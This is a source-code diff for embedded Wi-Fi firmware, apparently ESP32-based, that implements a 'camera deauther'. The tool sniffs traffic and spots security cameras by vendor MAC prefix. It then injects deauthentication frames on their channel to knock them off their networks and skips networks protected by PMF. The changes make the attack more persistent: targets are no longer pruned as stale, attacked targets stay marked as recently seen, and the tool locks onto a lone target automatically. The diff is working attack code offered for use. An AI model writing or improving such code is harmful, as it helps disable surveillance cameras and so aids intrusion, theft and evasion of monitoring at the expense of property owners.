@@ -212,7 +212,6 @@ static const int CAMERA_OUI_COUNT = sizeof(cameraOUIs) / sizeof(cameraOUIs[0]);
 #define MAX_AP_ENTRIES 12
 #define DEAUTH_INTERVAL_MS 100
 #define DEAUTH_BURST_COUNT 4
-#define TARGET_STALE_MS 10000
 #define DWELL_MS 1500
 
 struct CameraTarget {
@@ -450,34 +449,51 @@ static bool isPmfProtected(const uint8_t *apMAC) {
     return false;
 }
 
+static int findOldestTargetIndex() {
+    int oldestIdx = 0;
+    uint32_t oldestMs = g_targets[0].lastSeenMs;
+    for (int i = 1; i < g_targetCount; i++) {
+        if (g_targets[i].lastSeenMs < oldestMs) {
+            oldestMs = g_targets[i].lastSeenMs;
+            oldestIdx = i;
+        }
+    }
+    return oldestIdx;
+}
+
 static int findOrCreateTarget(const uint8_t *clientMAC, const uint8_t *apMAC, uint8_t channel, int ouiIdx) {
+    uint32_t now = millis();
     for (int i = 0; i < g_targetCount; i++) {
         if (memcmp(g_targets[i].clientMAC, clientMAC, 6) == 0) {
             memcpy(g_targets[i].apMAC, apMAC, 6);
             g_targets[i].channel = channel;
-            g_targets[i].ouiIndex = (ouiIdx >= 0) ? ouiIdx : g_targets[i].ouiIndex;
-            g_targets[i].lastSeenMs = millis();
+            if (ouiIdx >= 0) g_targets[i].ouiIndex = ouiIdx;
+            g_targets[i].lastSeenMs = now;
             return i;
         }
     }
+
+    int slotIdx = -1;
     if (g_targetCount < MAX_TARGETS) {
         bool hadAllItemBefore = hasDeauthAllItem();
-        memcpy(g_targets[g_targetCount].clientMAC, clientMAC, 6);
-        memcpy(g_targets[g_targetCount].apMAC, apMAC, 6);
-        g_targets[g_targetCount].channel = channel;
-        g_targets[g_targetCount].ouiIndex = (ouiIdx >= 0) ? ouiIdx : 0xFF;
-        g_targets[g_targetCount].lastSeenMs = millis();
-        g_targets[g_targetCount].deauthCount = 0;
-        g_targets[g_targetCount].active = g_deauthAll ? true : false;
-        g_targetCount++;
+        slotIdx = g_targetCount++;
         g_scanPaused = false;
         if (!hadAllItemBefore && hasDeauthAllItem()) {
             g_menuCursor++;
         }
         clampMenuCursor();
-        return g_targetCount - 1;
+    } else {
+        slotIdx = findOldestTargetIndex();
     }
-    return -1;
+
+    memcpy(g_targets[slotIdx].clientMAC, clientMAC, 6);
+    memcpy(g_targets[slotIdx].apMAC, apMAC, 6);
+    g_targets[slotIdx].channel = channel;
+    g_targets[slotIdx].ouiIndex = (ouiIdx >= 0) ? ouiIdx : 0xFF;
+    g_targets[slotIdx].lastSeenMs = now;
+    g_targets[slotIdx].deauthCount = 0;
+    g_targets[slotIdx].active = g_deauthAll ? true : false;
+    return slotIdx;
 }
 
 static void cameraSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
@@ -533,6 +549,8 @@ static void injectDeauths() {
         if (!g_targets[i].active) continue;
         if (g_targets[i].channel != g_channel) continue;
 
+        g_targets[i].lastSeenMs = now;
+
         if (isPmfProtected(g_targets[i].apMAC)) {
             g_skippedPmf++;
             continue;
@@ -576,27 +594,6 @@ static void hopChannel() {
     g_channelIndex = (g_channelIndex + 1) % g_channels.size();
     g_channel = g_channels[g_channelIndex];
     esp_wifi_set_channel(g_channel, WIFI_SECOND_CHAN_NONE);
-}
-
-// ============================================================
-// Target pruning
-// ============================================================
-
-static void pruneStaleTargets() {
-    uint32_t now = millis();
-    for (int i = g_targetCount - 1; i >= 0; i--) {
-        if (now - g_targets[i].lastSeenMs > TARGET_STALE_MS) {
-            bool hadAllItemBefore = hasDeauthAllItem();
-            for (int j = i; j < g_targetCount - 1; j++) {
-                g_targets[j] = g_targets[j + 1];
-            }
-            g_targetCount--;
-            if (hadAllItemBefore && !hasDeauthAllItem() && g_menuCursor > 0) {
-                g_menuCursor--;
-            }
-            clampMenuCursor();
-        }
-    }
 }
 
 // ============================================================
@@ -949,7 +946,6 @@ void cameraDeautherMenu() {
     while (!check(EscPress)) {
         hopChannel();
         injectDeauths();
-        pruneStaleTargets();
 
         if (millis() - lastRedraw > 250) {
             lastRedraw = millis();
@@ -977,7 +973,11 @@ void cameraDeautherMenu() {
                         g_scanPaused = false;
                         esp_wifi_set_promiscuous(true);
                         g_deauthActive = true;
-                        if (g_deauthAll) enableAllTargets();
+                        if (g_targetCount == 1) {
+                            lockSingleTarget(0);
+                        } else if (g_deauthAll) {
+                            enableAllTargets();
+                        }
                         g_lastHopMs = millis();
                         uiState = 2;
                         resetUiCache();
